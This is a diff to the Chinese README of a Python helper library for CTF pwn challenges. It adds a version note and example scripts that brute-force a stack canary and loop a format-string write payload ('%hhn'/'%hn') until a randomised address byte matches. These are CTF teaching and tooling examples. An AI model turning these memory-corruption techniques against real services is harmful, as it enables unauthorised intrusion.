@@ -8,14 +8,20 @@
   - [目录](#目录)
   - [前言](#前言)
   - [简介](#简介)
+  - [版本信息](#版本信息)
   - [快速上手](#快速上手)
   - [教程](#教程)
   - [示例](#示例)
+    - [栈溢出利用](#栈溢出利用)
+    - [awd利用](#awd利用)
+    - [爆破canary](#爆破canary)
+    - [爆破字节](#爆破字节)
   - [TODO](#TODO)
     - [Libcsearcher](#Libcsearcher)
     - [Shellocde](#Shellocde)
     - [Heap](#Heap)
     - [~~Awd~~](#Awd)
+    - [Qemu](#Qemu)
   - [其它](#其它)
 
 ## 前言
@@ -71,6 +77,13 @@
 
 - 增加了对canary逐字节爆破的功能，（仅限有的题目考点，如果题目canary损坏直接退出就不行了）
 - 修复了无法使用`pwnScript remote -u "127.0.0.1 9999"`直接交互的bug。
+
+
+
+2.1.6新增功能：
+
+- 完善了对canary的爆破，如果题目栈溢出canary损坏退出也可以爆破了。
+- 增加了对部分题目需要循环爆破某一地址或某一值的爆破方法，无需自行写循环去try except了。
 
 
 
@@ -523,7 +536,9 @@ if __name__ == '__main__':
 
 
 
-### 爆破canary利用
+### 爆破canary
+
+栈溢出之后，进程不会退出的，如下：
 
 ```python
 #!/usr/bin/env python3
@@ -595,6 +610,129 @@ if __name__ == '__main__':
 
 
 
+栈溢出之后，进程会退出EOF的（这种一般是远程canary固定，爆破出来为固定值的）如下：
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Author: ckyan
+Generation date: 2024-06-28 10:29:32
+"""
+
+"""
+GitHub:
+    https://github.com/c0mentropy/ckyan.pwnScript
+Help: 
+    python3 exp.py --help
+    python3 exp.py debug --help
+    python3 exp.py remote --help
+Local:
+    python3 exp.py debug --file ./pwn
+Remote:
+    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
+    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
+"""
+
+# ./exp.py de -f ./pwn
+# ./exp.py re -f ./pwn -u ""
+
+from ckyan.pwnScript import *
+
+def exp():
+    pandora_box.init_script()
+
+    elf = pandora_box.elf
+    libc = pandora_box.libc
+    p = pandora_box.conn
+
+    ru(b'Welcome!\n')
+
+
+
+if __name__ == '__main__':
+    # exp()
+    canary_attacker = Canary(exp=exp)
+
+    padding = 0x20 - 8
+
+    canary_attacker.brute_force_canary(padding=padding)
+
+    canary = canary_attacker.value
+    log_canary(uu64(canary))
+```
+
+
+
+### 爆破字节
+
+有的题目中有一位或几位会随机变化（比如栈地址或elf基地址中有一位无法获取，则需要循环执行，直到与远程相等）。
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Author: ckyan
+Generation date: 2024-06-28 10:06:46
+"""
+
+"""
+GitHub:
+    https://github.com/c0mentropy/ckyan.pwnScript
+Help: 
+    python3 exp.py --help
+    python3 exp.py debug --help
+    python3 exp.py remote --help
+Local:
+    python3 exp.py debug --file ./pwn
+Remote:
+    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
+    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
+"""
+
+# ./exp.py de -f ./pwn
+# ./exp.py re -f ./pwn -u ""
+
+from ckyan.pwnScript import *
+
+def exp():
+    pandora_box.init_script()
+
+    elf = pandora_box.elf
+    libc = pandora_box.libc
+    p = pandora_box.conn
+
+    ru(b'make strings and getshell\n')
+    # ru(b'the shit is ezfmt, M3?\n')
+
+    # raw_input()
+
+
+    pad = b''
+    # pad += b'%' + str(int(0xb8)).encode() + b'c%18$hhn'
+    pad += b'%x' * (18-2)
+    pad += b'%' + str(int(0xb8-0x6e)).encode() + b'c%hhn'
+    pad += b'%' + str(int(0x1242-0Xb8)).encode() + b'c%22$hn'
+
+    # print(pad)
+    # print(hex(len(pad)))
+
+    s(pad)
+
+
+if __name__ == '__main__':
+    # exp()
+
+    brute_attacker = BruteForce(exp=exp)
+
+    brute_attacker.attack()
+
+```
+
+
+
 
 
 ## TODO
@@ -657,7 +795,7 @@ if __name__ == '__main__':
 
 
 
-### qemu
+### Qemu
 
 
 
